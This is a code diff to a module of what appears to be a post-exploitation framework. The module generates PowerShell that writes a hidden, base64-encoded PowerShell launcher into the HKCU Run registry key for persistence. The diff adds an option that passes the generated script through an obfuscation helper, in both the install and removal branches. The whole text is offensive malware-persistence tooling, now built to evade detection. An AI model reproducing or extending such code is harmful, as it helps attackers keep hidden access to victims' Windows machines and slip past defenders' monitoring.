@@ -102,7 +102,7 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         listenerName = self.options['Listener']['Value']
 
@@ -148,7 +148,8 @@ class Module:
 
             script += "Remove-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name "+keyName+";"
             script += "'Registry Persistence removed.'"
-
+            if obfuscate:
+                script = helpers.obfuscate(psScript=script, obfuscationCommand=obfuscationCommand)
             return script
 
         if extFile != '':
@@ -234,5 +235,6 @@ class Module:
         script += "$null=Set-ItemProperty -Force -Path HKCU:Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ -Name "+keyName+" -Value '\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"$x="+locationString+";powershell -Win Hidden -enc $x\"';"
 
         script += "'Registry persistence established "+statusMsg+"'"
-
+        if obfuscate:
+            script = helpers.obfuscate(psScript=script, obfuscationCommand=obfuscationCommand)
         return script
